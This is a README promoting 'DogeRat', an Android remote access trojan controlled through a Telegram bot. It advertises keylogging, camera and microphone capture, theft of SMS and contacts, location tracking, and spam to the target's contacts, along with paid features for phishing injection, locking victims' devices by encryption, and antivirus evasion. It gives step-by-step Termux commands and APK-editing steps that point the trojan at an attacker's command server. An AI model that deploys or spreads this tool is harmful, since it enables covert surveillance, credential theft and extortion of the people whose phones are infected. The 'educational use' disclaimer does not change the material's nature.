
<p align="center">
  <i>A multifunctional Telegram based Android RAT without port forwarding</i>
</p>
 

<p align="center">
  <a href="https://sltechnicaltips.github.io/DogeRat/">
    <img src="\assets\images\apple-touch-icon.png" alt="Logo" />
  </a>
</p>

## Features
- 🔴 Real time
- 🌐 custom web view
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 📡 receive information about simcard provider
- 📳 vibrate target device
- 🛰️ receive device location
- ✉️ receive all target message
- ✉️ send sms with target device to any number
- ✉️ send sms with target device to all of his/her contacts
- 👤 recive all target contacts
- 💻 receive list of all installedd apps in target device
- 📷 capture main and front camera
- 🎙 capture microphone (with custom duration)
- 📋 receive last clipboard text
- ✅️ auto start after device boot
- 🔐 Keylogger
- ✨ Beautiful telegram bot interface
  ## DOGE RAT PAID VERSION FEATURES
- 🤖 Auto permisson  
- 🔐Encrypt/ Decrypt after encryption victims will be not able to use their devices
- 🖥️ Screenshot (get screenshot from your victim device)
- 🗨️ spam message in all contacts after installation which you will set in apk
- 🔐injection {inject appliactaion automatic with any login or any page unlimited }
- 🔐 Open any phising page in victim device
- 🖥️ Screenshot (get screenshot from your victim device)
- 📒 Gallery puller (Get all photos available in gallery)
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 🔤 Advance Keylogger
- 📁 receive any file or folder from target device
- 📁 delete any file or folder from target device
- 📁 PowerFull file manager
- ✨ Beautiful telegram bot interface
- 🤖 Undetectable by antivirus
- 🤖and more ......
<br>
<h2>Requirements</h2>
<ul>
  <li><span style="color: #0074D9;">APK EDITOR</span></li>
  <li><span style="color: #2ECC40;">TERMUX</span></li>
  <li>For hosting server code, you can use some free services like:</li>
  <ul>
    <li><a href="https://replit.com/" style="color: #FF4136;">replit.com</a></li>
    <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
    <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
  </ul>
  
<br>
 <p></p> (You can use uptimerobot from replit.com to stop the app from stopping.)</p>

  <li>Keep in mind that these sites can suspend your projects, so it's better to host on your own computer.</li>

  <br>

  <p align="center">
  <a href="https://sltechnicaltips.github.io/DogeRat/">
    <img src="https://img.shields.io/badge/📹%20VIDEO%20TUTORIALS%20AVAILABLE%20HERE-blue?style=for-the-badge" alt="Video Tutorials Available Here" />
  </a>
</p>
  
</ul>

<h2 align="center">Download</h2>

<p align="center">
  <a href="https://cybershieldx.com/termux.apk">
    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download Termux" />
  </a>
  <a href="https://cybershieldx.com/editor.apk">
    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK Editor" />
  </a>
</p>

<p align="center">
  <a href="https://sltechnicaltips.github.io/DogeRat/">
    <img src="\assets\images\web.png" alt="Website" />
  </a>
</p>

## How to host server in Termux 
<p>Run the following commands in Termux:</p>



```bash  
  pkg update && upgrade -y
  pkg install git -y
  git clone https://github.com/SLTechnicalTips/DogeRat 
  cd DogeRat
  bash start.sh
Enter your bot token 
Enter your chatid 
And hit enter
Now open a new Tab, and give these commands
pkg install openssh
bash port.sh 
Enter your telegram username And hit enter 
Copy url and minimize the termux
```

## Edit apk
 - Open Apk editor 
 - select apk
 - choose full edit
 - select decode all files
 - go to assets folder
 - open host.json
 - and enter url
 - in socket replace url https to wss 
 - build apk ,start the bott  Enjoy

## example
```bash  
  { 
  "host": "https://yoururl.com/", 
  "socket": "wss://yoururl.com/", 
  "webView": "https://google.com/" 
}
```

## How to Build in Android Studio

To build the application in Android Studio, follow these steps:

1. Open the Android Studio and import the application source code.
2. Navigate to the following path in the source code: `Utils/AppTools.kt`.
3. In the `AppTools.kt` file, locate the `data` variable and copy your server information into it.
4. However, before copying the server information directly into the variable, you must encode it using Base64.
5. Here is an example JSON structure for your server information:
```
{
"host" : "",
"socket" : "",
"webView" : "https://www.google.com"
}
```

6. Fill in the above JSON structure with your server information.
7. Go to https://www.base64encode.org/ and copy the encoded result of your JSON data.
8. In Android Studio, paste the encoded result into the `data` variable.
9. The final code should look like this:

```kotlin
fun getAppData(): AppData {
    val data = "<your encoded server info>"
    val text = decode(data)
    return json().fromJson(text, AppData::class.java)
}
```




<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
</p>

<p align="center">
  <b><i>Note:</i></b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. Dogerat is built for educational and internal use only.
</p>

<p align="center">
  <b><i>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
</p>

<p align="center">
  <b><i>Thank you for using Dogerat - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
</p>

<p align="center">
<h1 align="center">Sponsorship</h1>

<p align="center">If you find my work valuable, you can show your support by sponsoring me. 
  Your contribution will help me maintain and improve my projects, and it will encourage me to create more useful content.</p>

<p align="center">
    <a href="https://buymeacoffee.com/imesh_s_abeysinghe/">
    <img src="https://img.shields.io/badge/-Buy%20me%20a%20coffee-orange?style=for-the-badge&logo=buy-me-a-coffee&logoColor=white" alt="Buy me a coffee"></a>
</p>


